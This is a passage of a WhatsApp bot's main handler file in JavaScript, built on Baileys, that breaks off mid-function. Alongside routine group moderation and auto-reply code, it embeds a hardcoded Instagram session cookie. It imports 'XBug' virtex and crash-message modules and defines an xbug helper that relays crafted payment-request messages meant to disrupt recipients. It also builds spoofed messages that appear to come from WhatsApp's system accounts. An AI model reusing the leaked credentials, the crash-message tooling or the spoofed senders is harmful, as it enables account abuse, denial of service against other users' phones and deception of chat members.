
require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, Mimetype, generateWAMessage, prepareWAMessageMedia, prepareMessageFromContent,  areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const fss = require("fs-extra");
const os = require('os')
const util = require('util')
const path = require('path')
const axios = require('axios')
const cheerio = require('cheerio');
const chalk = require('chalk')
const fetch = require("node-fetch");
const imgbb = require('imgbb-uploader')
const FormData = require('form-data');
const request = require('request')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const gis = util.promisify(require("g-i-s"));
const ytdl = require('ytdl-core');
const thiccysapi = require('textmaker-thiccy')
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const jsobfus = require('javascript-obfuscator');
const { buffergif } = require('./lib/myfunc2')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ytMp4, ytMp4v2, ytMp3v2, ytMp3, ytPlay } = require("./lib/youtube");
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { jadibot, listJadibot } = require('./lib/rentbot')
const { msgFilter } = require('./lib/antispam');
const { performance } = require('perf_hooks')
const { igApi, getSessionId } = require('insta-fetcher');
let ig = new igApi("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
ig.setCookie("csrftoken=6wrPrUbsa05Csm9wlqxAOSqRwxxscjD;rur=16771\05427758921939\0541695476019:01f7994241f5e244ccf1bb676853d91b4f281e385e564f6c99a3592b27b0a39dada825e8;mid=Yy21jQALAAEmUl5E0beHHz_eVvyI;ds_user_id=27758921939;sessionid=27758921939%3ASGdS1WkMZToRfs%3A12%3AAYe5Sp23sp78pv0PnIRL6X-ySJdCDpe4uxbuJxtcxw;ig_did=09B76BA7-2D56-42E5-89BB-3584A9EAD69B");
const { fetchBuffer } = require("./lib/myfunc2")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { listmenu, rulesBot, donasiBot, infoOwner } = require('./help')
const { Configuration, OpenAIApi } = require("openai");
const parseRes = (parseResult = require("./lib/parseres"));
const expandUrl = require("./lib/expandUrl");
const { toPDF, toPDF2, nhPDF } = require("./lib/toPDF");
const { GDrive } = require("./lib/scrape/gdrive");
const { mediafire2 } = require("./lib/scrape/mediafire");
const { zippy, zippy2 } = require("./lib/scrape/zippy2");
const mynimeku = require("./lib/scrape/mynime"); 

// Animeh
let nime = "https://weebs-nime.kimiakomtol.repl.co/"
let samehadaku = nime + "samehadaku"
let oploverz = nime + "oploverz"
let otakudesu = nime + "otakudesu"

//TIME
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `Good Morning 🌄`
 } 
 
// read database game
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.math = []
let vote = db.data.others.vote = []

//read database jid
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));

//database virus and whatsapp bugs
//warrrrrrrrr
const { xeonvirtex } = require('./XBug/xeonvirtex')
const { xeonbutton } = require('./XBug/xeonbutton')
const { xeonbrutal } = require('./XBug/xeonbrutal')
const { iphone } = require('./XBug/virtex/iphone')
const { iphone5 } = require('./XBug/virtex/iphone5')
const { xeonbutton2 } = require('./XBug/virtex/xeonbutton2')
const { bugsw } = require('./XBug/virtex/bugsw')
const xpicvirus = fs.readFileSync(`./XBug/xpicvirus.png`)
//warrrrrrrrrr

//database auto reply
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));

module.exports = conn = async (conn, m, msg, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const { quotedMsg, mentioned, now, isBaileys } = msg
//var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
if (conn.multi){
    var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|!?#%^&.+,-\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓=|!?#%^&.+,-\/\\©^]/gi) : '#'
    } else {
        if (conn.nopref){
            prefix = ''
        } else {
            prefix = conn.prefa
        }
    }
const isCmd = body.startsWith(prefix)
//const command = body.replace(prefix, ' ').trim().split(/ +/).shift().toLowerCase()
const command = body.toLowerCase().split(' ')[0] || ''
//const args = body.trim().split(/ +/).slice(1)
const args = body.split(' ')
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner = ownernya.includes(m.sender)
const fromMe = m.sender == botNumber ? true : false
const text = q = body.slice(command.length + 1, body.length)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const type = Object.keys(mek.message)[0]  
const from = mek.key.remoteJid      
const content = JSON.stringify(mek.message)


const toJSON = (j) => JSON.stringify(j, null, 2);

	    const cekUser = (users, id) => {     
var cek = null
Object.keys(user).forEach((i) => { 
if (user[i].id === id){ cek = i } })
if (cek !== null){ 
if (users == "id"){ return user[cek].id }
if (users == "emote"){ return user[cek].emote }
if (users == "timers"){ return user[cek].timers }
if (users == "hit"){ return user[cek].hit }
if (users == "star"){ return user[cek].star }
if (users == "alasan"){ return user[cek].alasan }
if (users == "ban"){ return user[cek].ban }
if (users == "premium"){ return user[cek].premium }
}
if (cek == null) return null
}

//const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedMsg = (type == 'extendedTextMessage')
const isImage = (type === 'imageMessage')
const isAudio = (type === 'audioMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isList = (type == 'listResponseMessage')
const isButton = (type == 'buttonsResponseMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedList = isQuotedMsg ? content.includes('listResponseMessage') ? true : false : false
const isQuotedButton = isQuotedMsg ? content.includes('buttonsResponseMessage') ? true : false : false
const isQuotedContact = isQuotedMsg ? content.includes('contactMessage') ? true : false : false
	
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
	
// Group
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
	    const isBan = banned.includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const Autoreply = m.isGroup ? autorep.includes(from) : false
        const isNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const solot = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

//afk and other
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            
    let chats = global.db.data.chats[m.chat]
    if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
    if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
    } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
    }
    
    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
//function leveling & pick
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

// Public & Self
if (conn.mode === 'self') {
    if (!isOwner && !m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)

//auto react all message
/////conn.sendMessage(m.chat, {
          ////react: {
            ////////////////////////////////////////text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
            ////key: m.key,
          /////}})

//auto recording all
    if (global.autoRecord) { if (m.chat) { conn.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { conn.sendPresenceUpdate('composing', m.chat) }
}
//autoread all message
conn.readMessages([m.key])

//premium
const prem1 = `Hi bro  ${pushname} ${ucapanWaktu} \n\nThis feature is for premium members only, please buy premium to use this feature`
const prem2 = `Click the button below to buy premium`
const prem3 = [{buttonId: `${prefix}buypreim`,buttonText: {displayText: `BUY PREMIUM`,},type: 1,},]
blomdaftar = `${ucapanWaktu} @${sender.split("@")[0]} Kamu belum terdaftar di database cek private message mu untuk mendaftar`
limitabis = `*[YOUR LIMIT IS EXPIRED]*\nBuy limit in ${prefix}buylimit or buy premium to get unlimited limit`

//WARRRRRRR
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
const xbug = (teks) => {
  conn.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//-------------------End--------------------\\
//Dont edit ot recode or bug wont work

const fmedia =  {
  key : {
    fromMe: false,
participant : '0@s.whatsapp.net'
},
     contextInfo: {
    forwardingScore: 9999,
    isForwarded: false, //:'v
showAdAttribution: true,
title: botname,
mediaType: "VIDEO",
mediaUrl: websitex,
previewType: "PHOTO",
thumbnail: thumb,
sourceUrl: "",
detectLinks: false,
    }}
    
    //reply fake
	//group target \\
const reply = (teks) => {
           conn.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        async function getMembers(jid){
            let em = []
            for (let x of participants) {
               em.push(x.jid)
            }
            return em
         }
        async function sendMessageFromContent(jid, message, options) {
            var option = { contextInfo: {}, ...options }
            var prepare = await conn.prepareMessageFromContent(jid, message, option)
            await conn.relayWAMessage(prepare)
            return prepare
        }
	//button
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
conn.sendMessage(id, butonna, options)
}
const http = randomNomor(500)

//document
const kontol = {
	key : {
   participant : '0@s.whatsapp.net'
},
       message: {
    documentMessage: {
    title: `${pushname}`, 
    jpegThumbnail: thumb
  }
}
      }
sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, buttons, boddy, thumbnail, thumbnailUrl, sourceUrl, mediaUrl, options) => {
let buttonMessage = {
  document: doc,
  mimetype: "application/pdf",
  fileName: fileName,
  fileLength: fileLength,
  caption: caption,
  footer: footer,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
     title: time,
     body: boddy,
     thumbnail: thumbnail,
     thumbnailUrl: thumbnailUrl,
     sourceUrl: sourceUrl,
     mediaUrl: mediaUrl,  
     renderLargerThumbnail: true,
     showAdAttribution: true,
     mediaType: 1
   }}
       }
   conn.sendMessage(m.chat, buttonMessage, options)
   }
   
   // OBFUSCATOR JS
   async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}
        // Autosticker pc
        if(!m.isGroup) {
   if (isImage) {
    let media = await quoted.download()
    let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
    await fs.unlinkSync(encmedia)
    } else if (isVideo) {
    if ((quoted.msg || quoted).seconds > 11) return
    let media = await quoted.download()
    let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
    await fs.unlinkSync(encmedia)
    }
}
        // Autosticker gc
        if (isAutoSticker) {
            if (isImage) {
                let mediac = await quoted.download()
                await conn.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await conn.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        // Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			conn.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			conn.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

        //auto reply by xeon
  if (Autoreply)
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
					conn.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  if (Autoreply)
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
					conn.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
					}
			}
			  if (Autoreply)
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
					conn.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  if (Autoreply) 
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
					conn.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
